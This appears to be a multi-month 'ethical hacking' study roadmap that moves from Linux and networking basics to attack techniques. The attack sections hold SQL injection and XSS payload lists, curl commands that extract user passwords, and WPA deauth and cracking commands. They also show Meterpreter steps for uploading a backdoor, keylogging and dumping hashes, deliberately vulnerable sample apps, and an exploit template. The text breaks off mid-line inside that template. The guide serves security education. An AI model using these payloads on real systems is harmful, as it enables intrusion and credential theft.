# The Complete Ethical Hacking Roadmap

## From Zero to World-Class Ethical Hacker

> 🎯 **Your Mission**: Transform from beginner to elite ethical hacker through structured learning, hands-on practice, and continuous skill development.

---

## Table of Contents

1. [Mindset & Prerequisites](#mindset--prerequisites)
2. [Phase 1: Foundations (Months 1-3)](#phase-1-foundations)
3. [Phase 2: Core Skills (Months 4-6)](#phase-2-core-skills)
4. [Phase 3: Advanced Techniques (Months 7-12)](#phase-3-advanced-techniques)
5. [Phase 4: Specialization (Year 2)](#phase-4-specialization)
6. [Phase 5: Mastery (Year 3+)](#phase-5-mastery)
7. [Daily Practice Routine](#daily-practice-routine)
8. [Certifications Roadmap](#certifications-roadmap)
9. [Building Your Brand](#building-your-brand)
10. [Resources & Tools](#resources--tools)

---

## Mindset & Prerequisites

### The Hacker Mindset

**Core Principles:**

1. **Curiosity** - Always ask "How does this work?"
2. **Persistence** - Never give up when stuck
3. **Creativity** - Think outside the box
4. **Ethics** - Always use skills for good
5. **Continuous Learning** - Technology never stops evolving
6. **Problem-Solving** - Break complex problems into smaller pieces
7. **Attention to Detail** - Small things matter in security
8. **Documentation** - Write everything down

### Essential Traits to Develop

```markdown
✓ Analytical Thinking - Break down complex systems
✓ Patience - Exploitation takes time
✓ Research Skills - Find information efficiently
✓ Communication - Explain technical concepts clearly
✓ Teamwork - Collaborate with others
✓ Time Management - Balance learning and practice
✓ Stress Management - Handle pressure situations
✓ Ethical Responsibility - Know the consequences
```

### Legal & Ethical Framework

**Golden Rules:**

- ❌ NEVER hack without permission
- ✅ ALWAYS get written authorization
- ✅ Respect privacy and data
- ✅ Follow responsible disclosure
- ✅ Help organizations improve security
- ❌ NEVER use skills maliciously
- ✅ Stay within legal boundaries
- ✅ Build trust in the community

---

## Phase 1: Foundations (Months 1-3)

### Month 1: Computer Fundamentals

#### Week 1-2: Operating Systems Basics

**Linux Mastery:**

```bash
# Day 1-3: Linux Installation & Navigation
- Install Ubuntu/Kali Linux (dual boot or VM)
- Learn basic commands: ls, cd, pwd, mkdir, rm, cp, mv
- Understand file permissions: chmod, chown
- Master text editors: vim, nano

# Daily Practice (1-2 hours):
cd ~
mkdir hacking-journey
cd hacking-journey
echo "Day 1: Started my ethical hacking journey" > journal.txt
cat journal.txt

# Week 1 Goals:
- [ ] Install Linux successfully
- [ ] Navigate filesystem comfortably
- [ ] Execute 50+ basic commands
- [ ] Create, edit, delete files
- [ ] Understand directory structure

# Resources:
- Linux Journey: https://linuxjourney.com
- OverTheWire Bandit: https://overthewire.org/wargames/bandit/
```

**Bash Scripting:**

```bash
# Day 4-7: Bash Scripting Basics
# Create your first script
cat > my_first_script.sh << 'EOF'
#!/bin/bash

echo "Welcome to Ethical Hacking!"
echo "Today is $(date)"
echo "Current user: $(whoami)"
echo "System info: $(uname -a)"

# Practice loops
for i in {1..5}; do
    echo "Learning day $i"
done

# Practice conditionals
if [ -f "/etc/passwd" ]; then
    echo "System file exists"
fi
EOF

chmod +x my_first_script.sh
./my_first_script.sh

# Week 2 Goals:
- [ ] Write 10 bash scripts
- [ ] Understand variables, loops, conditionals
- [ ] Use pipes and redirections
- [ ] Process text with grep, sed, awk
- [ ] Automate simple tasks
```

**Windows Fundamentals:**

```powershell
# Learn Windows basics (even if focusing on Linux)
# PowerShell commands
Get-Process
Get-Service
Get-NetTCPConnection
Get-EventLog

# Registry basics
regedit

# Task Manager, Services, Event Viewer
# Understanding Windows architecture
```

#### Week 3-4: Networking Fundamentals

**Network Basics:**

```bash
# Understanding OSI Model (7 Layers):
1. Physical - Cables, signals
2. Data Link - MAC addresses, switches
3. Network - IP addresses, routers
4. Transport - TCP/UDP, ports
5. Session - Connection management
6. Presentation - Data formatting
7. Application - HTTP, FTP, SSH

# TCP/IP Model (4 Layers):
1. Network Access - Physical + Data Link
2. Internet - IP
3. Transport - TCP/UDP
4. Application - HTTP, DNS, etc.

# Practice Commands:
# Check your IP
ip addr show
ifconfig

# Check routing table
ip route
route -n

# DNS lookup
nslookup google.com
dig google.com

# Network connectivity
ping 8.8.8.8
traceroute google.com

# Active connections
netstat -tuln
ss -tuln

# Packet capture
sudo tcpdump -i eth0
sudo tcpdump -i eth0 -w capture.pcap

# Week 3-4 Goals:
- [ ] Understand OSI model completely
- [ ] Know common ports (80, 443, 22, 21, 25, etc.)
- [ ] Capture and analyze packets with Wireshark
- [ ] Understand TCP 3-way handshake
- [ ] Learn subnetting (CIDR notation)
- [ ] Set up a home lab network
```

**Subnetting Practice:**

```
# Master subnetting calculations:

Example: 192.168.1.0/24
- Network address: 192.168.1.0
- Broadcast: 192.168.1.255
- Usable IPs: 192.168.1.1 - 192.168.1.254
- Total hosts: 254

Practice with:
- 10.0.0.0/8
- 172.16.0.0/16
- 192.168.0.0/24
- Variable subnets: /25, /26, /27, /28

Use calculator: https://www.subnet-calculator.com/
```

### Month 2: Programming Fundamentals

#### Week 5-6: Python for Hacking

**Python Basics:**

```python
# Day 1-3: Python Installation & Basics
# hello.py
print("Hello, Ethical Hacker!")

# Variables and data types
name = "Alice"
age = 25
is_hacker = True
skills = ["Python", "Linux", "Networking"]

# Loops and conditionals
for skill in skills:
    print(f"Learning: {skill}")

if is_hacker:
    print("Keep learning!")

# Functions
def scan_port(ip, port):
    print(f"Scanning {ip}:{port}")

scan_port("192.168.1.1", 80)

# Week 5 Goals:
- [ ] Install Python 3.x
- [ ] Write 20+ simple programs
- [ ] Understand data structures (lists, dicts, sets)
- [ ] Master loops, conditionals, functions
- [ ] Learn file I/O operations
```

**Network Programming:**

```python
# Day 4-7: Socket Programming
# simple_client.py
import socket

def connect_to_server(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    response = client.recv(4096)
    print(response.decode())
    client.close()

connect_to_server('example.com', 80)

# simple_server.py
import socket

def start_server(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"Listening on port {port}")

    while True:
        client, address = server.accept()
        print(f"Connection from {address}")
        client.send(b"Hello from server!")
        client.close()

start_server(9999)

# Week 6 Goals:
- [ ] Create TCP client/server
- [ ] Build UDP client/server
- [ ] Make HTTP requests with requests library
- [ ] Parse HTML with BeautifulSoup
- [ ] Build simple port scanner
```

**Essential Python Scripts:**

```python
# port_scanner.py
import socket
from datetime import datetime

def scan_ports(target, start_port, end_port):
    print(f"Scanning {target}")
    print(f"Time started: {datetime.now()}")

    try:
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))

            if result == 0:
                print(f"Port {port}: OPEN")
            sock.close()
    except KeyboardInterrupt:
        print("\nScan interrupted")
    except socket.error:
        print("Couldn't connect to server")

    print(f"Time finished: {datetime.now()}")

# Usage
scan_ports('127.0.0.1', 1, 1024)

# Week 7-8 Goals:
- [ ] Build port scanner
- [ ] Create banner grabber
- [ ] Make HTTP fuzzer
- [ ] Write password cracker
- [ ] Build simple keylogger (ethical use only)
```

#### Week 7-8: Web Technologies

**HTML/CSS/JavaScript Basics:**

```html
<!-- index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Hacking Lab</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; }
        .terminal { padding: 20px; }
    </style>
</head>
<body>
    <div class="terminal">
        <h1>Ethical Hacking Lab</h1>
        <p id="output"></p>
    </div>

    <script>
        // Learn JavaScript basics
        function simulateHack() {
            const target = prompt("Enter target IP:");
            document.getElementById('output').innerHTML =
                `Scanning ${target}...<br>Port 80: OPEN<br>Port 443: OPEN`;
        }

        // XSS understanding (for defense)
        const userInput = "<script>alert('XSS')</script>";
        // Learn why this is dangerous

        setTimeout(simulateHack, 1000);
    </script>
</body>
</html>

# Goals:
- [ ] Understand DOM structure
- [ ] Learn JavaScript basics
- [ ] Know how XSS works
- [ ] Understand cookies and sessions
- [ ] Learn AJAX and APIs
```

**HTTP Protocol Deep Dive:**

```bash
# Using curl to understand HTTP
curl -v https://example.com

# Request headers
curl -H "User-Agent: MyBot" https://example.com

# POST request
curl -X POST -d "username=admin&password=test" https://example.com/login

# Save cookies
curl -c cookies.txt https://example.com

# Use cookies
curl -b cookies.txt https://example.com/dashboard

# Follow redirects
curl -L https://example.com

# Week 8 Goals:
- [ ] Understand HTTP methods (GET, POST, PUT, DELETE)
- [ ] Know HTTP status codes (200, 301, 403, 404, 500)
- [ ] Master request/response headers
- [ ] Understand authentication (Basic, Bearer, Cookie)
- [ ] Learn about REST APIs
```

### Month 3: Security Concepts

#### Week 9-10: Cryptography Basics

**Understanding Cryptography:**

```bash
# Symmetric encryption (AES)
echo "Secret message" | openssl enc -aes-256-cbc -a -salt

# Asymmetric encryption (RSA)
# Generate key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Hash functions
echo -n "password123" | md5sum
echo -n "password123" | sha256sum

# Password hashing (bcrypt)
htpasswd -bnBC 12 "" password123 | tr -d ':\n'

# Goals:
- [ ] Understand encryption vs encoding vs hashing
- [ ] Know common algorithms (AES, RSA, SHA)
- [ ] Learn about digital signatures
- [ ] Understand SSL/TLS
- [ ] Practice with OpenSSL
```

**Practical Cryptography:**

```python
# crypto_practice.py
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import hashlib
import base64

# Hashing
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# Symmetric encryption
def encrypt_message(message, key):
    cipher = AES.new(key.encode('utf-8').ljust(32)[:32], AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(message.encode())
    return base64.b64encode(nonce + tag + ciphertext).decode()

# Practice
password = "mypassword123"
hashed = hash_password(password)
print(f"Hashed: {hashed}")

message = "Secret data"
encrypted = encrypt_message(message, "encryption_key")
print(f"Encrypted: {encrypted}")
```

#### Week 11-12: Web Security Fundamentals

**OWASP Top 10 (2021):**

```markdown
1. **Broken Access Control**

   - Learn: IDOR, privilege escalation
   - Practice: Access other users' data

2. **Cryptographic Failures**

   - Learn: Weak encryption, exposed data
   - Practice: Find unencrypted sensitive data

3. **Injection**

   - Learn: SQL, NoSQL, Command injection
   - Practice: SQLMap, manual injection

4. **Insecure Design**

   - Learn: Design flaws, missing security controls
   - Practice: Threat modeling

5. **Security Misconfiguration**

   - Learn: Default configs, unnecessary features
   - Practice: Find exposed admin panels

6. **Vulnerable Components**

   - Learn: Outdated libraries, unpatched software
   - Practice: Exploit known CVEs

7. **Authentication Failures**

   - Learn: Weak passwords, session management
   - Practice: Brute force, session hijacking

8. **Software and Data Integrity Failures**

   - Learn: Insecure deserialization, CI/CD attacks
   - Practice: Exploit serialization flaws

9. **Security Logging & Monitoring Failures**

   - Learn: Insufficient logging, no alerting
   - Practice: Analyze logs for attacks

10. **Server-Side Request Forgery (SSRF)**
    - Learn: Make server request internal resources
    - Practice: Access cloud metadata

# Week 11-12 Goals:

- [ ] Study each OWASP Top 10 vulnerability
- [ ] Practice on DVWA (Damn Vulnerable Web App)
- [ ] Complete OWASP WebGoat exercises
- [ ] Build vulnerable and secure versions of each
```

**Practice Labs Setup:**

```bash
# Install DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Install OWASP Juice Shop
docker run --rm -p 3000:3000 bkimminich/juice-shop

# Install WebGoat
docker run -p 8080:8080 -p 9090:9090 webgoat/goatandwolf

# Create your own vulnerable app
mkdir vulnerable-app
cd vulnerable-app
npm init -y
npm install express

# vulnerable-server.js
const express = require('express');
const app = express();

// SQL Injection vulnerability (for learning)
app.get('/user', (req, res) => {
    const id = req.query.id;
    // Vulnerable: Never do this in production!
    const query = `SELECT * FROM users WHERE id = ${id}`;
    // This allows: /user?id=1 OR 1=1
    res.send(query);
});

app.listen(3000, () => console.log('Running on 3000'));
```

---

## Phase 2: Core Skills (Months 4-6)

### Month 4: Information Gathering & Reconnaissance

#### Week 13-14: Passive Reconnaissance

**OSINT Mastery:**

```bash
# Google Dorking
site:example.com
site:example.com ext:php
site:example.com inurl:admin
site:example.com filetype:pdf
site:example.com intitle:"index of"
inurl:example.com inurl:&
"@example.com" site:linkedin.com

# Tools Installation
sudo apt install -y \
    recon-ng \
    theharvester \
    maltego \
    spiderfoot

# TheHarvester - Email/subdomain gathering
theHarvester -d example.com -b all -l 500

# Recon-ng - Reconnaissance framework
recon-ng
marketplace install all
workspaces create example
db insert domains example.com
modules load recon/domains-hosts/google_site_web
run

# Shodan - Internet-connected device search
# Sign up at shodan.io
shodan search "apache city:Dhaka"
shodan host 8.8.8.8

# Week 13-14 Projects:
1. [ ] Create OSINT report on a company (yours)
2. [ ] Find all subdomains of target
3. [ ] Gather employee information (LinkedIn)
4. [ ] Map technology stack
5. [ ] Find exposed services with Shodan
```

**Subdomain Enumeration:**

```bash
# Active subdomain enumeration
sublist3r -d example.com -o subdomains.txt

# DNS brute force
dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt

# Certificate transparency
curl -s "https://crt.sh/?q=%.example.com&output=json" | \
    jq -r '.[].name_value' | sort -u

# Amass (comprehensive)
amass enum -passive -d example.com -o amass-results.txt
amass enum -active -d example.com -o amass-active.txt

# Automation script
cat > recon.sh << 'EOF'
#!/bin/bash
DOMAIN=$1

echo "[+] Starting reconnaissance on $DOMAIN"
mkdir -p recon/$DOMAIN

echo "[*] Subdomain enumeration..."
subfinder -d $DOMAIN -o recon/$DOMAIN/subdomains.txt
amass enum -passive -d $DOMAIN >> recon/$DOMAIN/subdomains.txt
sort -u recon/$DOMAIN/subdomains.txt -o recon/$DOMAIN/subdomains-final.txt

echo "[*] Checking live hosts..."
cat recon/$DOMAIN/subdomains-final.txt | httprobe > recon/$DOMAIN/live-hosts.txt

echo "[*] Taking screenshots..."
cat recon/$DOMAIN/live-hosts.txt | aquatone -out recon/$DOMAIN/screenshots

echo "[+] Reconnaissance complete!"
EOF

chmod +x recon.sh
./recon.sh example.com
```

#### Week 15-16: Active Reconnaissance

**Network Scanning:**

```bash
# Nmap mastery
# 1. Host discovery
nmap -sn 192.168.1.0/24

# 2. Port scanning techniques
nmap -sS target.com  # SYN scan (stealth)
nmap -sT target.com  # TCP connect scan
nmap -sU target.com  # UDP scan
nmap -sA target.com  # ACK scan (firewall testing)

# 3. Service detection
nmap -sV -p 1-65535 target.com

# 4. OS detection
sudo nmap -O target.com

# 5. Script scanning
nmap -sC target.com  # Default scripts
nmap --script vuln target.com  # Vulnerability scripts
nmap --script http-enum target.com  # HTTP enumeration

# 6. Comprehensive scan
sudo nmap -sS -sV -sC -A -p- -T4 target.com -oA full-scan

# 7. Firewall evasion
nmap -f target.com  # Fragment packets
nmap -D RND:10 target.com  # Decoy scan
nmap --source-port 53 target.com  # Spoof source port

# Week 15-16 Goals:
- [ ] Master 20+ Nmap techniques
- [ ] Scan 100+ ports on practice targets
- [ ] Create custom Nmap scripts (NSE)
- [ ] Perform comprehensive network discovery
- [ ] Understand firewall detection and evasion
```

**Web Application Reconnaissance:**

```bash
# Technology detection
whatweb -v https://example.com
wappalyzer https://example.com  # Browser extension

# Directory discovery
gobuster dir -u https://example.com \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,js -t 50

feroxbuster -u https://example.com \
    -w /usr/share/wordlists/dirb/common.txt \
    -t 100 -d 3 -x php,html

# API discovery
cat > api-wordlist.txt << EOF
/api
/api/v1
/api/v2
/v1
/v2
/rest
/graphql
/swagger
/api-docs
/openapi.json
EOF

gobuster dir -u https://example.com -w api-wordlist.txt

# Parameter discovery
arjun -u https://example.com/page
parameth -u https://example.com/page

# Wayback Machine
waybackurls example.com | tee wayback-urls.txt
cat wayback-urls.txt | grep -E "\.js$" > js-files.txt
```

### Month 5: Vulnerability Discovery

#### Week 17-18: Web Application Testing

**Manual Testing Methodology:**

```markdown
## 1. Information Gathering

- [ ] Map application structure
- [ ] Identify entry points
- [ ] Find hidden parameters
- [ ] Discover API endpoints
- [ ] Analyze client-side code

## 2. Authentication Testing

- [ ] Test for username enumeration
- [ ] Attempt brute force attacks (rate limiting?)
- [ ] Test password reset functionality
- [ ] Check session management
- [ ] Test logout functionality
- [ ] Try default credentials

## 3. Authorization Testing

- [ ] Test horizontal privilege escalation (access other users)
- [ ] Test vertical privilege escalation (become admin)
- [ ] Test IDOR vulnerabilities
- [ ] Check for missing function-level access control

## 4. Input Validation

- [ ] Test all input fields for injection
- [ ] Test file upload functionality
- [ ] Test for XSS in all parameters
- [ ] Check for command injection
- [ ] Test for path traversal

## 5. Logic Testing

- [ ] Test business logic flaws
- [ ] Check for race conditions
- [ ] Test payment bypasses
- [ ] Verify price manipulation
- [ ] Test workflow bypasses
```

**SQL Injection Deep Dive:**

```bash
# Manual SQL injection testing
# 1. Detect SQL injection
curl "https://example.com/page?id=1'"
curl "https://example.com/page?id=1 AND 1=1--"
curl "https://example.com/page?id=1 AND 1=2--"

# 2. Extract database information
curl "https://example.com/page?id=1 UNION SELECT NULL--"
curl "https://example.com/page?id=1 UNION SELECT database()--"
curl "https://example.com/page?id=1 UNION SELECT version()--"

# 3. Extract table names
curl "https://example.com/page?id=1 UNION SELECT table_name FROM information_schema.tables--"

# 4. Extract column names
curl "https://example.com/page?id=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"

# 5. Extract data
curl "https://example.com/page?id=1 UNION SELECT username,password FROM users--"

# SQLMap automation
sqlmap -u "https://example.com/page?id=1" --batch
sqlmap -u "https://example.com/page?id=1" --dbs
sqlmap -u "https://example.com/page?id=1" -D database_name --tables
sqlmap -u "https://example.com/page?id=1" -D database_name -T users --dump

# Week 17 Project:
# Create SQL injection cheat sheet with 50+ payloads
cat > sqli-payloads.txt << 'EOF'
# Authentication bypass
' OR '1'='1
' OR 1=1--
admin'--
admin' #
' UNION SELECT NULL--

# Error-based
' AND 1=CONVERT(int, @@version)--
' AND 1=CAST(@@version AS int)--

# Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

# Boolean-based blind
' AND 1=1--
' AND 1=2--

# Union-based
' UNION SELECT NULL,NULL--
' UNION SELECT database(),user()--
EOF
```

**XSS Testing:**

```bash
# XSS payload list
cat > xss-payloads.txt << 'EOF'
# Basic
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

# Event handlers
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>

# Bypasses
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="javascript:alert('XSS')">

# Encoded
%3Cscript%3Ealert('XSS')%3C/script%3E
\x3cscript\x3ealert('XSS')\x3c/script\x3e

# DOM-based
#<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
EOF

# XSStrike - XSS scanner
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt
python3 xsstrike.py -u "https://example.com/search?q=test"

# Manual XSS testing with Burp Suite
# 1. Intercept request
# 2. Send to Repeater
# 3. Inject payloads
# 4. Check response for execution
```

#### Week 19-20: Network Exploitation

**Buffer Overflow Basics:**

```python
# Simple buffer overflow example
# vulnerable_program.c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Vulnerable!
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}

# Compile: gcc vulnerable_program.c -o vulnerable -fno-stack-protector
# Test overflow: ./vulnerable $(python -c 'print("A" * 100)')

# Week 19-20 Goals:
- [ ] Understand stack structure
- [ ] Learn assembly basics (x86/x64)
- [ ] Practice with buffer overflow exercises
- [ ] Use GDB for debugging
- [ ] Learn Return-Oriented Programming (ROP)
```

**Wireless Hacking:**

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Capture handshake
sudo airodump-ng wlan0mon

# Target specific network
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# Deauth attack to capture handshake
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# WPS attack
sudo reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv

# Evil Twin attack (advanced)
sudo mana-toolkit

# Week 19-20 Wireless Goals:
- [ ] Capture WPA handshakes
- [ ] Crack WEP encryption
- [ ] Perform deauthentication attacks
- [ ] Set up fake access point
- [ ] Understand WPA3 security
```

### Month 6: Exploitation & Tools Mastery

#### Week 21-22: Metasploit Framework

**Metasploit Basics:**

```bash
# Start Metasploit
msfconsole

# Search for exploits
msf6 > search type:exploit platform:linux

# Use an exploit
msf6 > use exploit/multi/http/apache_struts_rce
msf6 > show options
msf6 > set RHOSTS target.com
msf6 > set RPORT 8080
msf6 > exploit

# Meterpreter commands
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > shell
meterpreter > download /etc/passwd
meterpreter > upload backdoor.exe C:\\Windows\\Temp
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Post-exploitation
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/linux/gather/enum_system

# Pivoting
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5

# Week 21-22 Goals:
- [ ] Master 20+ Metasploit exploits
- [ ] Learn all Meterpreter commands
- [ ] Practice post-exploitation
- [ ] Set up persistent access
- [ ] Pivot through networks
```

**Custom Exploit Development:**

```python
# Simple exploit template
import socket
import sys

def exploit(target_ip, target_port):
    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to target
    s.connect((target_ip, target_port))

    # Prepare payload
    buffer = b"A" * 1000
    payload = b"EXPLOIT " + buffer

    # Send exploit
    s.send(payload)

    # Receive response
    response = s.recv(4096)
    print(response
```
